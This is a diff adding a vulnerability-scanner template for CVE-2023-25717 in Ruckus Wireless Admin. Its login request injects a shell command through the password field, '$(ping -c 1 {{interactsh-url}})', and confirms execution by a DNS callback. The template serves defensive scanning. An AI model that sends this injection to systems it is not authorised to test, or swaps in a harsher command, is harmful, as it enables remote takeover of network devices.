@@ -1,0 +1,45 @@
+id: cve-2023-25717
+info:
+  name: Ruckus Wireless Admin Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Ruckus Wireless Admin is the management system for multiple routers and hardware devices. A command execution vulnerability exists in Ruckus Wireless Admin version 10.4 and earlier, allowing attackers to execute arbitrary commands.
+  reference:
+    - https://cybir.com/2023/cve/proof-of-concept-ruckus-wireless-admin-10-4-unauthenticated-remote-code-execution-csrf-ssrf/
+    - https://support.ruckuswireless.com/security_bulletins/315
+  classification:
+    cve-id: CVE-2023-25717
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: command-execution
+  metadata:
+    product: Ruckus Wireless Admin
+
+http:
+  - raw:
+      - |
+        GET /test.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "test"
+
+  - raw:
+      - |
+        GET /forms/doLogin?login_username=admin&password=password$(ping -c 1 {{interactsh-url}})&x=0&y=0 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
